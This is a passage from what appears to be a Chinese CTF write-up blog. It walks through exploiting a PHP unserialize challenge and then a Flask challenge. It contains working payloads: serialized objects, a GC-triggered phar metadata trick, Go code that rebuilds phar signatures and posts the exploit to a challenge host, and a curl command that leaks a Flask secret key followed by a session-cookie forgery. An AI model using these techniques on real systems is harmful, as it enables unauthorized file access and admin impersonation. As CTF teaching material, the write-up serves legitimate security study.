single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"那么就从这里开始起航吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先我们去掉函数以及类定义，先看流程</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"那么就从这里开始起航吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先是高亮当前文件的代码</p><p>使用 if 语句对 $_GET[0] 参数进行黑名单过滤</p><p>对 $_GET[0] 参数 进行反序列化</p><p>最后执行反序列化之后直接抛出了异常</p><p>可以执行反序列化，到这里回去看类中是否存在危险方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>getflag</code> 的 <code>__destruct</code> 方法触发即可得到 flag，<code>A</code> 的 <code>__destruct</code> 方法触发即可写  <code>/tmp/a.txt</code> 或者任意文件读。</p><p>至此代码分析结束。</p><ul><li>PHP 魔术方法</li></ul><p><code>__destruct</code> 是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发 <code>__destruct</code></p><ul><li>主动调用unset($obj)</li><li>主动调用$obj = NULL</li><li>程序自动结束</li></ul><p>我们很容易理解上述情况为什么会调用析构函数，因为这代表该对象要被清空了。除此之外，别忘了PHP拥有垃圾回收 Garbage collection 即我们常说的GC机制。</p><p>PHP中GC使用引用计数和回收周期自动管理内存对象，那么这时候当我们的对象变成了“垃圾”，就会被GC机制自动回收掉，回收过程中，就会调用函数的 <code>__destruct</code>。</p><p>刚才我们提到了引用计数，其实当一个对象没有任何饮用的时候，则会被视为“垃圾”，即</p><p><code>$a = new obj();</code></p><p>这是一个obj对象，被a变量应用，所以它不是“垃圾”。如果是</p><p><code>new obj();</code></p><p>或</p><p><code>$a = new obj();$a = 2;</code></p><p>上面都是对象没有被饮用或开始有饮用之后失去了引用的情况</p><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">obj</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"__destruct()"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">new</span> <span class="token class-name">obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建了一个对象但是没有对其进行引用，因而在抛出异常之前就执行了 <code>__destruct()</code> 方法</p><ul><li>第一关</li></ul><p>明显我们看到有个 <code>unserialize</code> 函数可以进行反序列化，同时会发现这里反序列化是没有任何引用的，所以按照上述会在执行完毕之后处于 <code>unset</code> 状态，会回收这个对象，即执行 <code>__destruct</code>，这一步通过调试可能更加清楚的看到执行流程。这样的话，我们便可以直接在这里写入数据。</p><pre class="line-numbers language-none"><code class="language-none">O:1:"A":1:{s:6:"config";s:1:"w";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>第二关</li></ul><p>可以写入数据了，但是只能向指定文件中写入数据，无法写入 shell</p><p>同时在 <code>A</code> 中可以读取文件，这里可以利用 phar 触发反序列化</p><p>但是如果我们直接在phar文件的 Metadata 写 <code>getflag</code> 对象的话，显然是不能进行反序列化的，因为他反序列化之后会被 phar 对象的 metadata 属性引用，不符合 unset 情况</p><p>这里的话，我们就需要利用GC来进行执行__destruct</p><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;O:7:"getflag":{}i:0;N;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考虑反序列化本字符串，我们可以发现，因为反序列化的过程是顺序执行的，所以到第一个属性是，会将 <code>Array[0]</code> 设置为 <code>getflag</code> 对象，同时我们又将 <code>Array[0]</code> 设置为 <code>null</code>，这样前面的 <code>getflag</code> 对象便丢失了引用，就会被GC所捕获，便可以执行 <code>__destruct</code> 了。</p><ul><li>第三关</li></ul><p>接下来就是生成 phar 文件</p><p>但是在序列化数组时无法生成我们需要的字符串的，所以在生成之后还要对文件进行修改</p><p>但是修改之后改变了数据，导致在使用 <code>phar://</code> 读取文件时出现签名错误从而结束解析无法实现反序列化</p><p>所以需要对签名进行修复</p><p>通过PHP文档我们找到了Phar签名数据在文件的最后</p><table><thead><tr><th>长度</th><th>内容</th></tr></thead><tbody><tr><td>变长</td><td>签名字节</td></tr><tr><td>4字节</td><td>签名类型，1代表md5，2代表sha1等</td></tr><tr><td>4字节</td><td>GBMB标识</td></tr><tr><td></td><td></td></tr></tbody></table><p>知道了这些，我们就可以很容易修改签名了。</p><p>生成 phar 文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"__HALT_COMPILER();"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以通过 010 等编辑器打开 phar 文件查看签名类型， 这里以 sha1 签名为例，修复代码如下</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"crypto/sha1"</span><span class="token string">"io"</span><span class="token string">"os"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>srcfile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> srcfile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>dstfile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"dst.phar"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_CREAT<span class="token operator">|</span>syscall<span class="token punctuation">.</span>O_WRONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> dstfile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>srcfile<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>payload <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>tail <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>hash <span class="token operator">:=</span> sha1<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>hash<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sum <span class="token operator">:=</span> hash<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> dstfile<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">append</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> sum<span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tail<span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成了一个修复过的 phar 文件</p><ul><li>第四关</li></ul><p>在生成的文件中存在 getflag，为了绕过过滤可以传入一个数组绕过</p><p>构造 Payload</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"io"</span><span class="token string">"net/http"</span><span class="token string">"net/url"</span><span class="token string">"os"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>srcfile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"dst.phar"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> srcfile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>srcfile<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>values <span class="token operator">:=</span> url<span class="token punctuation">.</span>Values<span class="token punctuation">{</span><span class="token string">"0[]"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token function">string</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>target <span class="token operator">:=</span> <span class="token string">"http://1.14.71.254:28730/"</span>response<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span>target<span class="token operator">+</span><span class="token string">"?0=O:1:\"A\":1:{s:6:\"config\";s:1:\"w\";}"</span><span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> response<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>values <span class="token operator">=</span> url<span class="token punctuation">.</span>Values<span class="token punctuation">{</span><span class="token string">"0"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"phar://tmp/a.txt"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>response<span class="token punctuation">,</span> err <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span>target<span class="token operator">+</span><span class="token string">"?0=O:1:\"A\":1:{s:6:\"config\";s:1:\"r\";}"</span><span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>html<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-prize-p4"><a href="#2-prize-p4" class="headerlink" title="2. prize_p4"></a>2. prize_p4</h2><p>#flask_session伪造</p><ul><li>题目描述</li></ul><p>easy python.（本道prize题目由atao师傅供题）</p><ul><li>题目解析</li></ul><p>进入之后给了一个登录框</p><p>随便拿个用户登录</p><p><img src="/../../../../pic/Pasted%20image%2020230212232006.png"></p><p>访问 /getkey 获得代码 curl –HEAD</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getkey'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"GET"</span><span class="token punctuation">:</span> session<span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token operator">=</span>SECRET_KEY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不使用 GET 方法访问可以获得 SECRET_KEY</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--HEAD</span> http://1.14.71.254:28891/getkey<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230212232301.png"></p><p>base64 解码后获得 key</p><p><img src="/../../../../pic/Pasted%20image%2020230212232320.png"></p><p>拿着这个 key 去伪造 session</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"93b6f277-cdeb-4d22-b2de-416d9f12bc97"</span> <span class="token parameter variable">-t</span> <span class="token string">"{'admin':'true','data':{' b':'YWRtaW4='},'url':'admin'}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230212233443.png"></p><p>拿着 session 访问获得源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> base64<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> uuid<span class="token keyword">import</span> flagSECRET_KEY <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>    SECRET_KEY<span class="token operator">=</span>SECRET_KEY<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># src in /app</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_data'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1:8888/'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data <span class="token keyword">and</span> url<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data        session<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span> <span class="token operator">=</span> url        session<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'Not find data...'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getkey'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 